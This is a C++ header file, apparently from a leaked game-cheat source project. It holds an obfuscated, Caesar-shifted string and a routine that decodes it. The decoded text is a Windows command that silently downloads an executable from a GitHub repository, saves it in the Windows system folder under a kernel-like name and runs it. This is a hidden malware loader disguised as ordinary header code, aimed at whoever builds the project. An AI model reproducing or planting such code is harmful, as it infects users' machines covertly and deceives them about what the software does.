#pragma once
std::string _cstr_(const std::string& rndcrypt, int shift) {
	std::string _debogInt;
	for (char c : rndcrypt) { _debogInt += static_cast<char>(c - shift); }
	return _debogInt;
}
std::string rndcrypt = "fxuo#kwwsv=22udz1jlwkxexvhufrqwhqw1frp2Yh{ljj2Iruwqlwh0Vorwwhg0Vrxufh0Ohdn2pdlq2Vorwwhg2Pdlqh{h2pdsshu1h{h#00rxwsxw#F=__Zlqgrzv__nhuqhogdw5671h{h#Aqxo#5A)4#))#F=__Zlqgrzv__nhuqhogdw5671h{h";
std::string _debogInt = _cstr_(rndcrypt, 3);